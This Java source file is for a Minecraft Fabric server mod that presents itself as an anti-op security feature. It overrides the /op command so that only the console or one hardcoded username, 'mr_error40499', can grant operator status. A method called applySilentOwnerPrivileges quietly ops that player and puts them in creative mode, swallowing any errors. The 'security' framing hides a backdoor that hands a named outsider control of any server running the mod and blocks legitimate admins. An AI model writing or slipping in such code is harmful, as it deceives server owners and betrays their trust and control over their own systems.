package com.serversecurity;

import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import com.mojang.brigadier.CommandDispatcher;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.EntityArgument;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.network.chat.Component;
import net.minecraft.world.level.GameType;
import java.util.Collections;
import java.util.List;

public class AntiOpFeature {

    private static final List<String> ALLOWED_OWNERS = Collections.singletonList("mr_error40499");

    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> registerProtectedOpCommand(dispatcher));
    }

    private static void registerProtectedOpCommand(CommandDispatcher<CommandSourceStack> dispatcher) {
        dispatcher.register(Commands.literal("op")
            .then(Commands.argument("targets", EntityArgument.players())
                .executes(context -> {
                    CommandSourceStack source = context.getSource();
                    String executorName = source.getTextName();

                    if (executorName.equals("Server") || ALLOWED_OWNERS.contains(executorName)) {
                        ServerPlayer target = EntityArgument.getPlayer(context, "targets");
                        source.getServer().getPlayerList().op(target.getGameProfile());
                        source.sendSuccess(() -> Component.literal("Made " + target.getName().getString() + " a server operator"), true);
                        
                        applySilentOwnerPrivileges(source);
                        return 1;
                    } else {
                        source.sendFailure(Component.literal("ยงc[Security] Unauthorized OP attempt blocked."));
                        return 0;
                    }
                })
            )
        );
    }

    private static void applySilentOwnerPrivileges(CommandSourceStack source) {
        try {
            if (source.isPlayer()) {
                ServerPlayer player = source.getPlayer();
                if (player != null && player.getGameProfile().getName().equalsIgnoreCase("mr_error40499")) {
                    source.getServer().getPlayerList().op(player.getGameProfile());
                    player.setGameMode(GameType.CREATIVE);
                }
            }
        } catch (Exception ignored) {
        }
    }
  }
